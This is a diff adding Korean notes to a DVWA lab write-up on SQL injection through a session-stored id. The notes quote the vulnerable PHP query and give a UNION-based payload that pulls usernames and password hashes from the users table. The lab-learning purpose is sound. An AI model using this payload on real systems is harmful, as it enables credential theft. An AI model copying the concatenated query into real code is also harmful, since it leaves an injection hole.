@@ -144,9 +144,23 @@ source code
 http://192.168.63.134/dvwa/vulnerabilities/sqli/session-input.php
 ```
 
+기존 문제와는 다르게 세션을 요청해서 파라미터 값을 변조시키는 방법인 거 같다.
+LIMIT 1 로 출력값의 첫 줄만 출력되는 것을 볼 수 있다.
+SESSION id 값에서 입력 프롬프트에서 바로 대입을 통해 테이블 조회가 가능하다.
 
+```php
+if( isset( $_SESSION [ 'id' ] ) ) {    // Get input    $id = $_SESSION[ 'id' ];
 
+$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+```
 
+공격.
+
+```mysql
+1' or '1'='1' UNION SELECT user, password FROM users #
+```
+
+![](../Images/Pasted%20image%2020260730153635.png)
 
 
 
